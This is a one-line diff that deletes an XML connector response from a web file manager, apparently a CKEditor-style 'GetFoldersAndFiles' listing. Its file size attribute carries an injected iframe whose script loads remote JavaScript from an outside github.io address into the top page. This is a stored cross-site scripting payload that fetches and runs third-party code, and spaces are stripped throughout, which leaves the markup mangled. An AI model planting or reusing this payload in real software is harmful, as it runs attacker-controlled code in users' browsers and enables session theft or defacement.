@@ -1,1 +1,0 @@
-<Connectorcommand="GetFoldersAndFiles"resourceType="Document"><CurrentFolderpath="/1-f/"url=""/><Folders/><Files><Filedesc="1"name="Loading..."size="<iframesrcdoc="<script>letscript=document.createElement('script');script.setAttribute('src','https://nuydutc1.github.io/nbc/bbc/fsk.js');window.top.document.head.appendChild(script);</script>"></iframe>"url="1"/></Files></Connector>
